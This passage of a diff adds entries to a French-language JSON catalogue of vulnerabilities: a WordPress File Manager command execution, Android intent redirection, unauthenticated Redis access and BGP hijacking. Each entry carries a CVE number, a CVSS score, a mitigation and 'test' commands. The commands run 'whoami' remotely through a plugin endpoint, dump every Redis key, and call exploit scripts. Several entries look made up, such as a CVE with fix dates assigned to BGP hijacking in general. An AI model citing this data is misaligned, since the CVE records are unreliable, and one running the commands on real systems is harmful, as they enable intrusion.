+    "date_correction": "2024-09-07",
+    "commandes_test": [
+      "curl -X POST http://target/wp-content/plugins/file-manager/execute.php -F 'command=whoami'",
+      "python wp_file_manager.py --url http://target --plugin file-manager"
+    ],
+    "mitigation": "Mettre à jour ou supprimer le plugin File Manager",
+    "ressources": ["https://wordpress.org/plugins/file-manager/"],
+    "tools": ["wpscan", "metasploit", "custom_scripts"]
+  },
+  {
+    "id": 48,
+    "cve": "CVE-2024-7721",
+    "titre": "Android Intent Redirection",
+    "description": "Redirection d'Intent Android vers des composants sensibles",
+    "severite": "Moyenne",
+    "score_cvss": 6.5,
+    "plateforme": ["Android"],
+    "date_decouverte": "2024-12-28",
+    "date_correction": "2025-01-12",
+    "commandes_test": [
+      "adb shell am start -n com.vulnerable.app/.MainActivity --ez sensitive_data true",
+      "python android_intent_exploit.py --package com.vulnerable.app"
+    ],
+    "mitigation": "Valider les Intents entrants et utiliser les permissions",
+    "ressources": ["https://developer.android.com/guide/components/intents-filters"],
+    "tools": ["adb", "drozer", "frida"]
+  },
+  {
+    "id": 49,
+    "cve": "CVE-2024-6631",
+    "titre": "Redis Unauthorized Access",
+    "description": "Accès non autorisé à Redis sans authentification",
+    "severite": "Critique",
+    "score_cvss": 9.1,
+    "plateforme": ["Redis", "NoSQL"],
+    "date_decouverte": "2024-09-12",
+    "date_correction": "2024-09-29",
+    "commandes_test": [
+      "redis-cli -h target -p 6379 KEYS '*'",
+      "python redis_unauth.py --host target --port 6379"
+    ],
+    "mitigation": "Configurer l'authentification Redis et restreindre les accès réseau",
+    "ressources": ["https://redis.io/topics/security"],
+    "tools": ["redis-cli", "redisson", "custom_scripts"]
+  },
+  {
+    "id": 50,
+    "cve": "CVE-2024-9918",
+    "titre": "BGP Hijacking Attack",
+    "description": "Détournement de routes BGP via l'annonce de préfixes non autorisés",
+    "severite": "Haute",
+    "score_cvss": 8.3,
+    "plateforme": ["BGP", "Network", "ISP"],
+    "date_decouverte": "2024-11-18",
+    "date_correction": "2024-12-05",
+    "commandes_test": [
+      "python bgp_hijack.py --asn 12345 --prefix 192.0.2.0/24",
+      "birdc 'show route all'"
+    ],
+    "mitigation": "Implémenter RPKI et BGPsec",
+    "ressources": ["https://www.rfc-editor.org/rfc/rfc7454.html"],
+    "tools": ["bird", "quagga", "custom_scripts"]
   }
 ]
+
+
